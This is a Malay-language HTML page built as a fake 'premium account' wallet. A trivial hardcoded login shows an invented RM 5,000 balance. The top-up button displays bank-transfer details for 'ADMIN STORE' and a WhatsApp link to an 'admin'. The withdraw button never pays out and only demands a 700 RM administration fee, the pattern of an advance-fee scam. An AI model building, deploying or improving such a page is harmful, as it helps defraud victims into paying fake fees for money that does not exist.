<!DOCTYPE html>
<html lang="ms">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Akaun Premium</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: 'Segoe UI', sans-serif;
}

body{
    background:linear-gradient(180deg,#020617,#0f172a);
    color:white;
}

/* HEADER */
.header{
    padding:20px;
    display:flex;
    justify-content:space-between;
    align-items:center;
}

.logo{
    font-size:20px;
    font-weight:bold;
    color:#facc15;
}

.profile{
    width:40px;
    height:40px;
    border-radius:50%;
    background:#1e293b;
}

/* CARD SALDO */
.balance-card{
    margin:15px;
    padding:20px;
    border-radius:20px;
    background:linear-gradient(135deg,#1e3a8a,#9333ea);
    box-shadow:0 10px 30px rgba(0,0,0,0.5);
}

.balance-card h2{
    font-size:14px;
    opacity:0.8;
}

.balance{
    font-size:32px;
    margin-top:10px;
    font-weight:bold;
}

.user{
    margin-top:10px;
    font-size:13px;
    opacity:0.8;
}

/* MENU */
.menu{
    display:flex;
    gap:10px;
    padding:15px;
}

.menu button{
    flex:1;
    padding:15px;
    border:none;
    border-radius:15px;
    font-weight:bold;
    color:white;
}

.topup{background:#22c55e;}
.withdraw{background:#ef4444;}

/* CARD ADMIN */
.admin{
    margin:15px;
    padding:20px;
    border-radius:20px;
    background:#0f172a;
    border:1px solid rgba(255,255,255,0.1);
}

.row{
    display:flex;
    justify-content:space-between;
    margin:10px 0;
}

/* INPUT */
.input{
    padding:15px;
    margin:15px;
}

.input input{
    width:100%;
    padding:15px;
    border-radius:15px;
    border:none;
    background:#1e293b;
    color:white;
}

/* BUTTON WA */
.wa{
    margin:15px;
}

.wa button{
    width:100%;
    padding:15px;
    border:none;
    border-radius:15px;
    background:#25D366;
    font-weight:bold;
}

/* LOGIN */
#login{
    padding:20px;
}

#dashboard{display:none;}

.login-box{
    margin-top:100px;
    background:#0f172a;
    padding:20px;
    border-radius:20px;
}

.login-box input{
    width:100%;
    padding:15px;
    margin:10px 0;
    border-radius:10px;
    border:none;
    background:#1e293b;
    color:white;
}

.login-box button{
    width:100%;
    padding:15px;
    border:none;
    border-radius:10px;
    background:#22c55e;
    font-weight:bold;
}
</style>

</head>
<body>

<!-- LOGIN -->
<div id="login">
    <div class="login-box">
        <h2>Log Masuk</h2>
        <input type="text" id="id" placeholder="ID">
        <input type="password" id="pass" placeholder="Kata Laluan">
        <button onclick="login()">Masuk</button>
    </div>
</div>

<!-- DASHBOARD -->
<div id="dashboard">

<div class="header">
    <div class="logo">AKAUN VIP</div>
    <div class="profile"></div>
</div>

<div class="balance-card">
    <h2>Baki Semasa</h2>
    <div class="balance" id="saldo">RM 0</div>
    <div class="user" id="user"></div>
</div>

<div class="input">
    <input type="number" id="jumlah" placeholder="Masukkan jumlah">
</div>

<div class="menu">
    <button class="topup" onclick="showAdmin()">Tambah Baki</button>
    <button class="withdraw" onclick="withdraw()">Pengeluaran</button>
</div>

<div class="admin" id="adminBox" style="display:none;">
    <h3>Pindahan ke Admin</h3>

    <div class="row">
        <span>Bank</span><span>BRI</span>
    </div>

    <div class="row">
        <span>No Akaun</span><span>1234567890</span>
    </div>

    <div class="row">
        <span>Nama</span><span>ADMIN STORE</span>
    </div>

    <div class="row">
        <span>Jumlah</span><span id="nominal">RM 0</span>
    </div>

    <div class="wa">
        <a id="waLink" target="_blank">
            <button>Chat WhatsApp Admin</button>
        </a>
    </div>
</div>

</div>

<script>

let currentUser=null;

const noAdmin="6285183034790";

const users=[
    {id:"123",password:"123",nama:"Farid Fauzan",saldo:5000}
];

function login(){
    let id=document.getElementById("id").value;
    let pass=document.getElementById("pass").value;

    let user=users.find(u=>u.id===id && u.password===pass);

    if(user){
        currentUser=user;
        document.getElementById("login").style.display="none";
        document.getElementById("dashboard").style.display="block";

        document.getElementById("user").innerText=user.nama+" ("+user.id+")";
        updateSaldo();
    }else{
        alert("Login gagal");
    }
}

function formatRM(x){
    return x.toLocaleString("ms-MY");
}

function updateSaldo(){
    document.getElementById("saldo").innerText="RM "+formatRM(currentUser.saldo);
}

function showAdmin(){
    let jumlah=parseInt(document.getElementById("jumlah").value);

    if(!jumlah){
        alert("Masukkan jumlah!");
        return;
    }

    document.getElementById("adminBox").style.display="block";
    document.getElementById("nominal").innerText="RM "+formatRM(jumlah);

    let msg=`Halo admin, saya top up RM ${formatRM(jumlah)} ID ${currentUser.id}`;
    document.getElementById("waLink").href=`https://wa.me/${noAdmin}?text=${encodeURIComponent(msg)}`;
}

function withdraw(){
    alert("Sila selesaikan caj pentadbiran 700 RM terlebih dahulu!");
}

</script>

</body>
</html>
